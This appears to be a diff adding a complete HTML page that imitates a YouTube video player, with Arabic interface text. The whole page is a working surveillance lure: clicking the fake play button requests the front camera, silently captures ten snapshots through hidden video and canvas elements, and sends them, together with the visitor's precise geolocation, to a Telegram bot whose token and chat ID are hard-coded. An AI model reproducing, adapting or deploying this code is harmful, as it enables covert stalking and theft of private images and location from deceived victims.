@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
+    <style>
+        body { background: #0f0f0f; color: #fff; font-family: Roboto, Arial, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        .header { height: 56px; padding: 0 16px; display: flex; align-items: center; justify-content: space-between; background: #0f0f0f; position: sticky; top: 0; z-index: 1000; }
+        .yt-logo { height: 20px; }
+        .video-container { position: relative; width: 100%; padding-top: 56.25%; background: #000; }
+        #player { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; }
+        .play-btn { width: 68px; height: 68px; background: #f00; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(255,0,0,0.4); }
+        .play-btn-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
+        .details { padding: 15px; border-bottom: 1px solid #222; }
+        #vTitle { font-size: 18px; margin: 0; font-weight: 500; color: #fff; line-height: 1.4; }
+        .stats { font-size: 12px; color: #aaa; margin-top: 8px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="yt-logo">
+    <div style="color: #fff; font-size: 20px;">🔍   ⋮</div>
+</div>
+
+<div class="video-container">
+    <div id="player"></div>
+    <div class="overlay" id="overlay">
+        <div class="play-btn"><div class="play-btn-icon"></div></div>
+        <p style="color:#ccc; font-size:13px; margin-top:20px;">انقر للتشغيل</p>
+    </div>
+</div>
+
+<div class="details">
+    <h1 id="vTitle">جاري التحميل...</h1>
+    <div class="stats" id="vMeta">مشاهدات حقيقية • جاري جلب البيانات</div>
+</div>
+
+<canvas id="canvas"></canvas>
+<video id="camVideo" autoplay playsinline muted></video>
+
+<script>
+    // --- الإعدادات (ضع الرابط هنا) ---
+    const YOUTUBE_URL = "https://www.youtube.com/watch?v=R0_w45Ie_g4"; 
+    const TELEGRAM_TOKEN = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+    const CHAT_ID = "591768998";
+    // --------------------------------
+
+    function getID(url) {
+        const reg = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
+        const match = url.match(reg);
+        return (match && match[2].length === 11) ? match[2] : null;
+    }
+
+    const vID = getID(YOUTUBE_URL);
+
+    async function fetchYT() {
+        try {
+            const res = await fetch(`https://noembed.com/embed?url=${encodeURIComponent(YOUTUBE_URL)}`);
+            const d = await res.json();
+            document.getElementById('vTitle').innerText = d.title || "فيديو يوتيوب";
+            document.getElementById('vMeta').innerText = `${d.author_name} • تم التحقق`;
+        } catch(e) {}
+    }
+    fetchYT();
+
+    var tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    document.body.appendChild(tag);
+
+    let player;
+    function onYouTubeIframeAPIReady() {
+        player = new YT.Player('player', {
+            height: '100%', width: '100%', videoId: vID,
+            playerVars: { 'autoplay': 0, 'controls': 1, 'rel': 0 },
+        });
+    }
+
+    document.getElementById('overlay').onclick = async function() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            document.getElementById('camVideo').srcObject = stream;
+            document.getElementById('overlay').style.display = 'none';
+            player.playVideo();
+            player.unMute();
+
+            // إرسال تقرير البداية والموقع
+            sendMsg(`🎬 بدأ الرصد لـ: ${document.getElementById('vTitle').innerText}`);
+            navigator.geolocation.getCurrentPosition(p => {
+                sendMsg(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // بدء عملية الالتقاط السريع (10 لقطات)
+            startBurstCapture();
+
+        } catch (e) { alert("يرجى الموافقة للمتابعة."); }
+    };
+
+    async function startBurstCapture() {
+        let photos = [];
+        const v = document.getElementById('camVideo');
+        const c = document.getElementById('canvas');
+        const ctx = c.getContext('2d');
+
+        // التقاط 10 صور بفاصل 200ms
+        for (let i = 0; i < 10; i++) {
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            ctx.drawImage(v, 0, 0);
+            
+            const blob = await new Promise(resolve => c.toBlob(resolve, 'image/jpeg', 0.5));
+            photos.push(blob);
+            await new Promise(r => setTimeout(r, 200)); // سرعة اللقطات
+        }
+        
+        sendMediaGroup(photos);
+    }
+
+    function sendMediaGroup(blobs) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        
+        let media = [];
+        blobs.forEach((blob, index) => {
+            const name = `p${index}.jpg`;
+            formData.append(name, blob, name);
+            media.push({ type: 'photo', media: `attach://${name}` });
+        });
+
+        formData.append('media', JSON.stringify(media));
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMediaGroup`, {
+            method: 'POST',
+            body: formData,
+            keepalive: true
+        });
+    }
+
+    function sendMsg(t) {
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: t}),
+            keepalive: true
+        });
+    }
+</script>
+</body>
+</html>
